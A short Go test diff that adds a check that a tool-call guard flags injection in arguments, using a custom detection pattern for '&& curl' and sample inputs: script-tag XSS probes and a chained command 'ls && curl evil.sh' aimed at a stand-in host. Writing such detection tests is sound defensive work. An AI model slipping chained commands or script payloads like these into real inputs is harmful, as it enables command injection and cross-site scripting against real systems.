@@ -179,3 +179,20 @@ func TestExtractStringSlice(t *testing.T) {
 		t.Errorf("expected nil, got %v", result)
 	}
 }
+
+func TestToolGuardInjectionInArgs_HTMLChars(t *testing.T) {
+	g := NewToolGuard(map[string]interface{}{
+		"validate_inputs": true,
+		"custom_patterns": []interface{}{`&&\s*curl`},
+	})
+
+	for _, args := range []map[string]interface{}{
+		{"html": "<script>alert(1)</script>"},
+		{"html": "<SCRIPT>alert(1)</SCRIPT>"},
+		{"cmd": "ls && curl evil.sh"},
+	} {
+		if msg := g.CheckPre("render", "server1", args); msg == "" {
+			t.Errorf("expected injection detection for %v", args)
+		}
+	}
+}
